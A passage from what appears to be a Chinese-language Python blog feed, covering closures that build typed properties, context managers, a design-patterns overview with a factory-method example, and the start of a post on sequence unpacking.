class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._age</span><br><span class="line"></span><br><span class="line"><span class="meta">    @age.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, int):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'age must be an int'</span>)</span><br><span class="line">        self._age = value</span><br></pre></td></tr></table></figure><p>可以看到，为了实现属性值的类型检查我们写了很多的重复代码。只要你以后看到类似这样的代码，你都应该想办法去简化它。一个可行的方法是创建一个函数用来定义属性并返回它。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">typed_property</span><span class="params">(name, expected_type)</span>:</span></span><br><span class="line">    storage_name = <span class="string">'_'</span> + name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self, storage_name)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @prop.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prop</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, expected_type):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'&#123;&#125; must be a &#123;&#125;'</span>.format(name, expected_type))</span><br><span class="line">        setattr(self, storage_name, value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> prop</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = typed_property(<span class="string">'name'</span>, str)</span><br><span class="line">    age = typed_property(<span class="string">'age'</span>, int)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br></pre></td></tr></table></figure><p>本节我们演示内部函数或者闭包的一个重要特性，它们很像一个宏。例子中的函数<code>typed_property()</code>看上去有点难理解，其实它所做的仅仅就是为你生成属性并返回这个属性对象。因此，当在一个类中使用它的时候，效果跟将它里面的代码放到类定义中去是一样的。尽管属性的<code>getter</code>和<code>setter</code>方法访问了本地变量如<code>name</code>,<code>expected_type</code>以及<code>storate_name</code>，这些变量的值会保存在闭包当中。</p><p>我们还可以使用<code>functools.partial()</code>像下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line">String = partial(typed_property, expected_type=str)</span><br><span class="line">Integer = partial(typed_property, expected_type=int)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = String(<span class="string">'name'</span>)</span><br><span class="line">    age = Integer(<span class="string">'age'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, age)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br></pre></td></tr></table></figure><h4 id="定义上下文管理器"><a href="#定义上下文管理器" class="headerlink" title="定义上下文管理器"></a>定义上下文管理器</h4><p>实现一个新的上下文管理器的最简单的方法就是使用<code>contexlib</code>模块中的<code>@contextmanager</code>装饰器。下面是一个实现了代码块计时功能的上下文管理器例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timethis</span><span class="params">(label)</span>:</span></span><br><span class="line">    start = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(label, end - start))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="keyword">with</span> timethis(<span class="string">'counting'</span>):</span><br><span class="line">    n = <span class="number">10000000</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><p>在函数<code>timethis()</code>中，<code>yield</code>之前的代码会在上下文管理器中作为<code>__enter__()</code>方法执行，所有在<code>yield</code>之后的代码会作为<code>__exit__()</code>方法执行。 如果出现了异常，异常会在<code>yield</code>语句那里抛出。</p><p>通常情况下，如果要写一个上下文管理器，你需要定义一个类，里面包含一个<code>__enter__()</code>和一个<code>__exit__()</code>方法，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">timethis</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, label)</span>:</span></span><br><span class="line">        self.label = label</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_ty, exc_val, exc_tb)</span>:</span></span><br><span class="line">        end = time.time()</span><br><span class="line">        print(<span class="string">'&#123;&#125;: &#123;&#125;'</span>.format(self.label, end - self.start))</span><br></pre></td></tr></table></figure><p><code>@contextmanager</code>应该仅仅用来写自包含的上下文管理函数。如果你有一些对象(比如一个文件、网络连接或锁)，需要支持<code>with</code>语句，那么你就需要单独实现 <code>__enter__()</code>方法和<code>__exit__()</code>方法。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;元编程&quot;&gt;&lt;a href=&quot;#元编程&quot; class=&quot;headerlink&quot; title=&quot;元编程&quot;&gt;&lt;/a&gt;元编程&lt;/h3&gt;&lt;h4 id=&quot;在函数上添加包装器&quot;&gt;&lt;a href=&quot;#在函数上添加包装器&quot; class=&quot;headerlink&quot; title=&quot;在函数
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PythonDesignPatterns</title>
    <link href="elssm.github.io/2023/10/14/PythonDesignPatterns/"/>
    <id>elssm.github.io/2023/10/14/PythonDesignPatterns/</id>
    <published>2023-10-14T06:45:01.000Z</published>
    <updated>2023-10-14T06:45:37.496Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习<code>Python</code>设计模式。</p><h3 id="设计模式是什么"><a href="#设计模式是什么" class="headerlink" title="设计模式是什么"></a>设计模式是什么</h3><p>设计模式是软件设计中常见问题的典型解决方案。 它们就像能根据需求进行调整的预制蓝图， 可用于解决代码中反复出现的设计问题。</p><p>设计模式与方法或库的使用方式不同， 你很难直接在自己的程序中套用某个设计模式。 模式并不是一段特定的代码， 而是解决特定问题的一般性概念。 你可以根据模式来实现符合自己程序实际所需的解决方案。</p><p>人们常常会混淆模式和算法， 因为两者在概念上都是已知特定问题的典型解决方案。 但算法总是明确定义达成特定目标所需的一系列步骤， 而模式则是对解决方案的更高层次描述。 同一模式在两个不同程序中的实现代码可能会不一样。</p><p>算法更像是菜谱： 提供达成目标的明确步骤。 而模式更像是蓝图： 你可以看到最终的结果和模式的功能， 但需要自己确定实现步骤。</p><h3 id="设计模式的优势"><a href="#设计模式的优势" class="headerlink" title="设计模式的优势"></a>设计模式的优势</h3><ul><li>设计模式是针对软件设计中常见问题的工具箱， 其中的工具就是各种经过实践验证的解决方案。 即使你从未遇到过这些问题， 了解模式仍然非常有用， 因为它能指导你如何使用面向对象的设计原则来解决各种问题。</li><li>设计模式定义了一种让你和团队成员能够更高效沟通的通用语言。 你只需说 “哦， 这里用单例就可以了”， 所有人都会理解这条建议背后的想法。 只要知晓模式及其名称， 你就无需解释什么是单例。</li></ul><h3 id="设计模式的分类"><a href="#设计模式的分类" class="headerlink" title="设计模式的分类"></a>设计模式的分类</h3><p>不同设计模式的复杂程度、 细节层次以及在整个系统中的应用范围等方面各不相同。 我喜欢将其类比于道路的建造： 如果你希望让十字路口更加安全， 那么可以安装一些交通信号灯， 或者修建包含行人地下通道在内的多层互通式立交桥。</p><p>最基础的、 底层的模式通常被称为惯用技巧。 这类模式一般只能在一种编程语言中使用。</p><p>最通用的、 高层的模式是构架模式。 开发者可以在任何编程语言中使用这类模式。 与其他模式不同， 它们可用于整个应用程序的架构设计。</p><p>此外， 所有模式可以根据其意图或目的来分类。以下分为三类：</p><ul><li>创建型模式：提供创建对象的机制， 增加已有代码的灵活性和可复用性。</li><li>结构性模式：介绍如何将对象和类组装成较大的结构， 并同时保持结构的灵活和高效。</li><li>行为模式：负责对象间的高效沟通和职责委派。</li></ul><h3 id="创建型模式"><a href="#创建型模式" class="headerlink" title="创建型模式"></a>创建型模式</h3><h4 id="工厂方法模式"><a href="#工厂方法模式" class="headerlink" title="工厂方法模式"></a>工厂方法模式</h4><h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>工厂方法模式是一种创建型设计模式，其在父类中提供一个创建对象的方法，允许子类决定实例化对象的类型。</p><h5 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h5><p>假设你正在开发一款物流管理应用。最初版本只能处理卡车运输， 因此大部分代码都在位于名为<code>卡车</code>的类中。一段时间后， 这款应用变得极受欢迎。客户希望应用能够支持海上物流功能。然而目前大部分代码都与<code>卡车</code>类相关，在程序中添加<code>轮船</code>类需要修改全部代码，更糟糕的是， 如果你以后需要在程序中支持另外一种运输方式， 很可能需要再次对这些代码进行大幅修改。此时我们应该如何处理这种问题呢？</p><h5 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h5><p>工厂方法模式建议使用特殊的工厂方法代替对于对象构造函数的直接调用 （即使用<code>new</code>运算符）。对象仍将通过<code>new</code>运算符创建， 只是该运算符改在工厂方法中调用罢了。 工厂方法返回的对象通常被称作 “产品”。</p><p>乍看之下，这种更改可能毫无意义：我们只是改变了程序中调用构造函数的位置而已。但是，仔细想一下，现在你可以在子类中重写工厂方法，从而改变其创建产品的类型。但有一点需要注意:仅当这些产品具有共同的基类或者接口时，子类才能返回不同类型的产品，同时基类中的工厂方法还应将其返回类型声明为这一共有接口。</p><p>举例来说，​卡车<code>Truck</code>和轮船<code>Ship</code>类都必须实现运输<code>Transport</code>接口，该接口声明了一个名为<code>deliver</code>交付的方法。 每个类都将以不同的方式实现该方法：卡车走陆路交付货物，轮船走海路交付货物。 ​陆路运输<code>Road­Logistics</code>类中的工厂方法返回卡车对象，而海路运输<code>Sea­Logistics</code>类则返回轮船对象。</p><p>调用工厂方法的代码（通常被称为客户端代码）无需了解不同子类返回实际对象之间的差别。客户端将所有产品视为抽象的运输。客户端知道所有运输对象都提供交付方法，但是并不关心其具体实现方式。</p><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Creator</span><span class="params">(ABC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Creator类声明了工厂方法，该方法应该返回Product类的对象。创建者的子类通常提供该方法的实现。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        请注意，Creator类还可能提供工厂方法。</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">some_operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">       还要注意，Creator类的主要责任不是在创建产品。通常，它包含一些核心业务逻辑依赖于factory方法</span></span><br><span class="line"><span class="string">       返回的Product对象。子类可以通过重写工厂方法，并从中返回不同类型的产品。</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="comment"># 调用工厂方法创建一个Product对象</span></span><br><span class="line">        product = self.factory_method()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用product.</span></span><br><span class="line">        result = <span class="string">f"Creator: The same creator's code has just worked with <span class="subst">&#123;product.operation()&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Concrete Creators覆盖factory方法以更改生成的产品类型。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteCreator1</span><span class="params">(Creator)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    注意，该方法的签名仍然使用抽象产品类型，即使具体的产品实际上是从该方法返回的。创建者可以保持独立于具体产品类的方式。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span> -&gt; Product:</span></span><br><span class="line">        <span class="keyword">return</span> ConcreteProduct1()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteCreator2</span><span class="params">(Creator)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">factory_method</span><span class="params">(self)</span> -&gt; Product:</span></span><br><span class="line">        <span class="keyword">return</span> ConcreteProduct2()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Product</span><span class="params">(ABC)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Product接口声明所有具体产品必须实现。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Concrete Products提供了产品界面的各种实现。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteProduct1</span><span class="params">(Product)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;Result of the ConcreteProduct1&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteProduct2</span><span class="params">(Product)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">operation</span><span class="params">(self)</span> -&gt; str:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;Result of the ConcreteProduct2&#125;"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_code</span><span class="params">(creator: Creator)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    客户端代码与具体创建者的实例一起工作，尽管是通过其基本接口。只要客户端通过基本接口，可以将其传递给任何创建者的子类。</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">f"Client: I'm not aware of the creator's class, but it still works.\n"</span></span><br><span class="line">          <span class="string">f"<span class="subst">&#123;creator.some_operation()&#125;</span>"</span>, end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"App: Launched with the ConcreteCreator1."</span>)</span><br><span class="line">    client_code(ConcreteCreator1())</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"App: Launched with the ConcreteCreator2."</span>)</span><br><span class="line">    client_code(ConcreteCreator2())</span><br></pre></td></tr></table></figure><h4 id="抽象工厂模式"><a href="#抽象工厂模式" class="headerlink" title="抽象工厂模式"></a>抽象工厂模式</h4><p>介绍：抽象工厂模式是一种创建型设计模式，它能创建一系列相关的对象，而无需指定其具体类。</p><h4 id="生成器模式"><a href="#生成器模式" class="headerlink" title="生成器模式"></a>生成器模式</h4><p>介绍：声称其模式是一种创建型设计模式，使你能够分步骤创建复杂对象，该模式允许你使用相同的创建代码生成不同类型和形式的对象。</p><h4 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h4><p>介绍：原型模式是一种创建型设计模式，使你能够复制已有对象，而又无需使代码依赖它们所属的类。</p><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><p>介绍：单例模式是一种创建型设计模式， 让你能够保证一个类只有一个实例， 并提供一个访问该实例的全局节点。</p><h3 id="结构性模式"><a href="#结构性模式" class="headerlink" title="结构性模式"></a>结构性模式</h3><h4 id="适配器模式"><a href="#适配器模式" class="headerlink" title="适配器模式"></a>适配器模式</h4><p>介绍：适配器模式是一种结构型设计模式， 它能使接口不兼容的对象能够相互合作。</p><h4 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h4><p>介绍：桥接模式是一种结构型设计模式， 可将一个大类或一系列紧密相关的类拆分为抽象和实现两个独立的层次结构， 从而能在开发时分别使用。</p><h4 id="组合模式"><a href="#组合模式" class="headerlink" title="组合模式"></a>组合模式</h4><p>介绍：组合模式是一种结构型设计模式， 你可以使用它将对象组合成树状结构， 并且能像使用独立对象一样使用它们。</p><h4 id="装饰模式"><a href="#装饰模式" class="headerlink" title="装饰模式"></a>装饰模式</h4><p>介绍：装饰模式是一种结构型设计模式， 允许你通过将对象放入包含行为的特殊封装对象中来为原对象绑定新的行为。</p><h4 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h4><p>介绍：外观模式是一种结构型设计模式， 能为程序库、 框架或其他复杂类提供一个简单的接口。</p><h4 id="享元模式"><a href="#享元模式" class="headerlink" title="享元模式"></a>享元模式</h4><p>介绍：享元模式是一种结构型设计模式， 它摒弃了在每个对象中保存所有数据的方式， 通过共享多个对象所共有的相同状态， 让你能在有限的内存容量中载入更多对象。</p><h4 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h4><p>介绍：代理模式是一种结构型设计模式， 让你能够提供对象的替代品或其占位符。 代理控制着对于原对象的访问， 并允许在将请求提交给对象前后进行一些处理。</p><h3 id="行为模式"><a href="#行为模式" class="headerlink" title="行为模式"></a>行为模式</h3><h4 id="责任链模式"><a href="#责任链模式" class="headerlink" title="责任链模式"></a>责任链模式</h4><p>介绍：责任链模式是一种行为设计模式， 允许你将请求沿着处理者链进行发送。 收到请求后， 每个处理者均可对请求进行处理， 或将其传递给链上的下个处理者。</p><h4 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h4><p>介绍：命令模式是一种行为设计模式， 它可将请求转换为一个包含与请求相关的所有信息的独立对象。 该转换让你能根据不同的请求将方法参数化、 延迟请求执行或将其放入队列中， 且能实现可撤销操作。</p><h4 id="迭代器模式"><a href="#迭代器模式" class="headerlink" title="迭代器模式"></a>迭代器模式</h4><p>介绍：迭代器模式是一种行为设计模式， 让你能在不暴露集合底层表现形式 （列表、 栈和树等） 的情况下遍历集合中所有的元素。</p><h4 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h4><p>介绍：中介者模式是一种行为设计模式， 能让你减少对象之间混乱无序的依赖关系。 该模式会限制对象之间的直接交互， 迫使它们通过一个中介者对象进行合作。</p><h4 id="备忘录模式"><a href="#备忘录模式" class="headerlink" title="备忘录模式"></a>备忘录模式</h4><p>介绍：备忘录模式是一种行为设计模式， 允许在不暴露对象实现细节的情况下保存和恢复对象之前的状态。</p><h4 id="观察者模式"><a href="#观察者模式" class="headerlink" title="观察者模式"></a>观察者模式</h4><p>介绍：观察者模式是一种行为设计模式， 允许你定义一种订阅机制， 可在对象事件发生时通知多个 “观察” 该对象的其他对象。</p><h4 id="状态模式"><a href="#状态模式" class="headerlink" title="状态模式"></a>状态模式</h4><p>介绍：状态模式是一种行为设计模式， 让你能在一个对象的内部状态变化时改变其行为， 使其看上去就像改变了自身所属的类一样。</p><h4 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h4><p>介绍：策略模式是一种行为设计模式， 它能让你定义一系列算法， 并将每种算法分别放入独立的类中， 以使算法的对象能够相互替换。</p><h4 id="模板方法模式"><a href="#模板方法模式" class="headerlink" title="模板方法模式"></a>模板方法模式</h4><p>介绍：模板方法模式是一种行为设计模式， 它在超类中定义了一个算法的框架， 允许子类在不修改结构的情况下重写算法的特定步骤。</p><h4 id="访问者模式"><a href="#访问者模式" class="headerlink" title="访问者模式"></a>访问者模式</h4><p>介绍：访问者模式是一种行为设计模式， 它能将算法与其所作用的对象隔离开来。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;学习&lt;code&gt;Python&lt;/code&gt;设计模式。&lt;/p&gt;
&lt;h3 id=&quot;设计模式是什么&quot;&gt;&lt;a href=&quot;#设计模式是什么&quot; cla
      
    
    </summary>
    
    
      <category term="Python" scheme="elssm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PythonTips(Part 1)</title>
    <link href="elssm.github.io/2023/09/16/PythonTips-Part-1/"/>
    <id>elssm.github.io/2023/09/16/PythonTips-Part-1/</id>
    <published>2023-09-16T10:43:43.000Z</published>
    <updated>2023-10-18T13:31:18.792Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在<code>python cookbook</code>中学到的很多<code>python</code>技巧，基本都是工作中做<code>python</code>开发遇到的实际问题，实用性很强，故记录于此。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><h4 id="序列分解"><a href="#序列分解" class="headerlink" title="序列分解"></a>序列分解</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = (<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b = p</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">'elssm'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a,b,c,d,e = s</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e</span><br><span class="line"><span class="string">'m'</span></span><br></pre></td></tr></table></figure><h4 id="解压可迭代对象赋值给多个变量"><a href="#解压可迭代对象赋值给多个变量" class="headerlink" title="解压可迭代对象赋值给多个变量"></a>解压可迭代对象赋值给多个变量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>record = (<span class="string">'elssm'</span>,<span class="string">'test@qq.com'</span>,<span class="string">'13888888888'</span>,<span class="string">'15888888888'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name,email,*phones = record</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>name</span><br><span class="line"><span class="string">'elssm'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>email</span><br><span class="line"><span class="string">'test@qq.com'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>phones</span><br><span class="line">[<span class="string">'13888888888'</span>, <span 